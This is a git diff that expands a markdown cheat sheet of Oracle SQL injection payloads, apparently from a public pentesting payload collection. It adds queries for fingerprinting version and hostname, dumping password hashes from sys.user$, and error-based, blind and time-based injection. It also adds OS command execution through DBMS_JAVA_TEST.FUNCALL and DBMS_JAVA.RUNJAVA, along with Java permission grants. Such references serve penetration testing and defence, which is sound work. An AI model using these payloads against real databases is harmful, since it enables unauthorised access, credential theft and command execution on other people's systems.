@@ -2,8 +2,12 @@
 
 ## Summary
 
-* [Oracle SQL version](#oracle-sql-version)
-* [Oracle SQL database name](#oracle-sql-database-name)
+* [Oracle SQL Default Databases](#oracle-sql-default-databases)
+* [Oracle SQL Comments](#oracle-sql-comments)
+* [Oracle SQL Version](#oracle-sql-version)
+* [Oracle SQL Hostname](#oracle-sql-hostname)
+* [Oracle SQL Database Name](#oracle-sql-database-name)
+* [Oracle SQL Database Credentials](#oracle-sql-database-credentials)
 * [Oracle SQL List databases](#oracle-sql-list-databases)
 * [Oracle SQL List columns](#oracle-sql-list-columns)
 * [Oracle SQL List tables](#oracle-sql-list-tables)
@@ -13,13 +17,43 @@
 * [Oracle SQL Command execution](#oracle-sql-command-execution)
 * [References](#references)
 
-## Oracle SQL version
+
+## Oracle SQL Default Databases
+
+| Name               | Description               |
+|--------------------|---------------------------|
+| SYSTEM             | Available in all versions |
+| SYSAUX             | Available in all versions |
+
+
+## Oracle SQL Comments
+
+| Type                       | Description                       |
+|----------------------------|-----------------------------------|
+| `-- -`                     | SQL comment                       |
+
+
+## Oracle SQL Version
 
 ```sql
 SELECT user FROM dual UNION SELECT * FROM v$version
+SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
+SELECT version FROM v$instance;
 ```
 
-## Oracle SQL database name
+
+## Oracle SQL Hostname
+
+```sql
+SELECT host_name FROM v$instance; (Privileged)
+SELECT UTL_INADDR.get_host_name FROM dual;
+SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
+SELECT UTL_INADDR.get_host_address FROM dual;
+```
+
+
+## Oracle SQL Database Name
 
 ```sql
 SELECT global_name FROM global_name;
@@ -28,11 +62,22 @@ SELECT instance_name FROM V$INSTANCE;
 SELECT SYS.DATABASE_NAME FROM DUAL;
 ```
 
+
+## Oracle SQL Database Credentials
+
+| Query                                   | Description               |
+|-----------------------------------------|---------------------------|
+| `SELECT username FROM all_users;`       | Available on all versions |
+| `SELECT name, password from sys.user$;` | Privileged, <= 10g        |
+| `SELECT name, spare4 from sys.user$;`   | Privileged, <= 11g        |
+
+
 ## Oracle SQL List Databases
 
 ```sql
 SELECT DISTINCT owner FROM all_tables;
 ```
+
 
 ## Oracle SQL List Columns
 
@@ -40,6 +85,7 @@ SELECT DISTINCT owner FROM all_tables;
 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
 SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
 ```
+
 
 ## Oracle SQL List Tables
 
@@ -49,33 +95,71 @@ SELECT owner, table_name FROM all_tables;
 SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 ```
 
+
 ## Oracle SQL Error based
 
-| Description  | Query  |
-| :------------- | :------------- |
-| Invalid HTTP Request  | SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual |
-| CTXSYS.DRITHSX.SN     | SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual |
-| Invalid XPath         | SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual |
-| Invalid XML           | SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual |
-| Invalid XML           | SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users |
+| Description           | Query          |
+| :-------------------- | :------------- |
+| Invalid HTTP Request  | `SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual` |
+| CTXSYS.DRITHSX.SN     | `SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual` |
+| Invalid XPath         | `SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual` |
+| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual` |
+| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |
+| SQL Error             | `SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))` |
+| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |
+| XDBURITYPE getclob    | `XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()` |
+
+When the injection point is inside a string use : `'||PAYLOAD--`
+
 
 ## Oracle SQL Blind
 
-| Description | Query |
-| :------------- | :------------- |
-| Version is 12.2	       | SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; |
-| Subselect is enabled	 | SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) |
-| Table log_table exists | SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); |
-| Column message exists in table log_table | SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
-| First letter of first message is t | SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
+| Description              | Query          |
+| :----------------------- | :------------- |
+| Version is 12.2	       | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |
+| Subselect is enabled	   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |
+| Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
+| Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
+| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |
+
 
 ## Oracle SQL Time based
 
 ```sql
-AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                 comment:   -- /**/
+AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
 ```
 
-## Oracle SQL Command execution
+
+## Oracle SQL Command Execution
+
+* [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
+
+### Oracle Java Execution
+
+* List Java privileges
+    ```sql
+    select * from dba_java_policy
+    select * from user_java_policy
+    ```
+* Grant privileges
+    ```sql
+    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
+    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
+    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
+    ```
+* Execute commands
+    * 10g R2, 11g R1 and R2: `DBMS_JAVA_TEST.FUNCALL()`
+    ```sql
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
+    ```
+    * 11g R1 and R2: `DBMS_JAVA.RUNJAVA()`
+    ```sql
+    SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
+    ```
+
+
+### Oracle Java Class
 
 ```sql
 /* create Java class */
@@ -106,4 +190,9 @@ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 
 ## References
 
-* [Heavily taken inspired by - NetSpi SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [NetSpi - SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [ASDC12 - New and Improved Hacking Oracle From Web - OWASP](https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
+* [Pentesting Oracle TNS Listener - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener)
+* [ODAT: Oracle Database Attacking Tool - quentinhardy](https://github.com/quentinhardy/odat/wiki/privesc)
+* [WebSec CheatSheet - Oracle](https://www.websec.ca/kb/sql_injection#Oracle_Default_Databases)
+* [New payload to exploit Error-based SQL injection - Oracle database - Mannu Linux - 12/09/2023](https://www.mannulinux.org/2023/12/New-payload-to-exploit-Error-based-SQL-injection-Oracle-database.html)
